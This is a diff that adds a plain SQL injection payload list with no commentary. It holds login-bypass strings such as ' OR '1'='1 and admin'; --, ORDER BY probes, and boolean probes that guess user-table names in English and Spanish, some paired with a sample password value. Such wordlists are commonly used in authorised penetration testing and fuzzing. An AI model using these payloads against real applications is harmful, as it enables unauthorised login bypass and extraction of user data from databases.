@@ -1,0 +1,227 @@
+
+
+mb1' or 1=1 ORDER BY activo DESC; -- 
+mA123aad222
+
+mb1' or 1=1 ORDER BY active DESC; -- 
+mA123aad222
+
+mb1' or 1=1 ORDER BY estatus DESC; -- 
+mA123aad222
+
+ma1' or 1=1 ORDER BY status DESC; -- 
+mA123aad222
+
+or 1=1 -- 
+or 1=1 #
+
+' OR '1'='1
+' OR '1'='1 
+
+' OR '1'='1 
+m2' OR '1'='1 
+
+AND user is TRUE; -- 
+AND user is TRUE; -- 
+
+' OR user LIKE '%a%'; -- 
+' AND 1=(SELECT COUNT(*) FROM user); -- 
+
+' OR user LIKE '%e%'; --  
+' AND 1=(SELECT COUNT(*) FROM user); -- 
+
+' OR user LIKE '%i%'; --  
+' AND 1=(SELECT COUNT(*) FROM user); -- 
+
+' OR user LIKE '%o%'; --  
+' AND 1=(SELECT COUNT(*) FROM user); -- 
+
+' OR user LIKE '%u%'; --  
+' AND 1=(SELECT COUNT(*) FROM user); -- 
+
+' OR usuario LIKE '%a%'; --  
+' AND 1=(SELECT COUNT(*) FROM usuario); -- 
+
+' OR usuario LIKE '%e%'; --  
+' AND 1=(SELECT COUNT(*) FROM usuario); -- 
+
+' OR usuario LIKE '%i%'; --  
+' AND 1=(SELECT COUNT(*) FROM usuario); -- 
+
+' OR usuario LIKE '%o%'; --  
+' AND 1=(SELECT COUNT(*) FROM usuario); -- 
+
+' OR usuario LIKE '%u%'; --  
+' AND 1=(SELECT COUNT(*) FROM usuario); -- 
+
+' OR username LIKE '%a%'; --  
+' AND 1=(SELECT COUNT(*) FROM username); -- 
+
+' OR username LIKE '%e%'; --  
+' AND 1=(SELECT COUNT(*) FROM username); -- 
+
+' OR username LIKE '%i%'; --  
+' AND 1=(SELECT COUNT(*) FROM username); -- 
+
+' OR username LIKE '%o%'; --  
+' AND 1=(SELECT COUNT(*) FROM username); -- 
+
+' OR username LIKE '%u%'; --  
+' AND 1=(SELECT COUNT(*) FROM username); -- 
+
+' OR usuarios LIKE '%a%'; --  
+' AND 1=(SELECT COUNT(*) FROM usuarios); -- 
+
+' OR usuarios LIKE '%e%'; --  
+' AND 1=(SELECT COUNT(*) FROM usuarios); -- 
+
+' OR usuarios LIKE '%i%'; --  
+' AND 1=(SELECT COUNT(*) FROM usuarios); -- 
+
+' OR usuarios LIKE '%o%'; --  
+' AND 1=(SELECT COUNT(*) FROM usuarios); -- 
+
+' OR usuarios LIKE '%u%'; --  
+' AND 1=(SELECT COUNT(*) FROM usuarios); -- 
+
+' OR 1>=(SELECT COUNT(*) FROM usuarios); # 
+' OR 1>=(SELECT COUNT(*) FROM usuarios); #  
+
+' OR 1>=(SELECT COUNT(*) FROM usuario); # 
+' OR 1>=(SELECT COUNT(*) FROM usuario); #  
+
+' OR 1>=(SELECT COUNT(*) FROM user); #  
+' OR 1>=(SELECT COUNT(*) FROM user); # 
+
+' OR 1>=(SELECT COUNT(*) FROM username); #  
+' OR 1>=(SELECT COUNT(*) FROM username); # 
+
+' OR 1>=(SELECT COUNT(*) FROM usernames); #  
+' OR 1>=(SELECT COUNT(*) FROM usernames); # 
+
+' OR 1>=(SELECT COUNT(*) FROM usuarios); -- 
+' OR 1>=(SELECT COUNT(*) FROM usuarios); --  
+
+' OR 1>=(SELECT COUNT(*) FROM usuario); -- 
+' OR 1>=(SELECT COUNT(*) FROM usuario); -- 
+
+' OR 1>=(SELECT COUNT(*) FROM user); -- 
+' OR 1>=(SELECT COUNT(*) FROM user); -- 
+
+' OR 1>=(SELECT COUNT(*) FROM username); -- 
+' OR 1>=(SELECT COUNT(*) FROM username); -- 
+
+' OR 1>=(SELECT COUNT(*) FROM usernames); -- 
+' OR 1>=(SELECT COUNT(*) FROM usernames); -- 
+
+' or 1=1 LIMIT 1; --
+' or 1=1 LIMIT 1; --
+
+' or 1=1;
+' or 1=1;
+
+
+ ' or ''='
+ ' or ''='
+ 
+ ' or ' '='
+ ' or ' '='
+ 
+ ' or true--
+ ' or true--
+ 
+ " or true-- 
+ " or true-- 
+ 
+ " or ""="
+ " or ""="
+ 
+ " or 1-- 
+ " or 1-- 
+ 
+' or 'x'='x
+' or 'x'='x
+
+' or 0=0 -- 
+' or 0=0 -- 
+
+" or 0=0 -- 
+or 0=0 -- 
+
+or 0=0 -- 
+' or 0=0 # 
+' or 0=0 # 
+
+" or 0=0 # 
+" or 0=0 # 
+
+or 0=0 # 
+or 0=0 # 
+
+" or "x"="x
+" or "x"="x
+
+') or ('x'='x
+') or ('x'='x
+' or 1=1-- 
+" or 1=1-- 
+
+or 1=1-- 
+or 1=1-- 
+
+' or a=a--
+" or "a"="a
+
+hi" or "a"="a
+hi" or 1=1 --
+
+hi' or 1=1 --
+'or'1=1'
+
+and 1=1--
+and 1=1
+
+' or 'one'='one
+' and 'one'='one
+
+' or 'one'='one--
+' and 'one'='one--
+
+admin'; --
+admin' -- 
+
+root'; --
+root' --
+
+or 1=1 --
+or 1=1 # 
+
+' or '1'='1
+' or 'x'='x
+
+' or 0=0 --
+" or 0=0 --
+
+' or 0=0 #
+" or 0=0 #
+
+' or 0=0 --
+" or 0=0 --
+
+or 0=0 #
+or 0=0 #
+
+or 0=0 --
+or 0=0 --
+
+' or 'x'='x
+" or "x"="x
+
+' or a=a--
+" or "a"="a
+
+hi" or "a"="a
+hi" or "a"="a
+
+'or' 1=1'
+'or' 1=1'
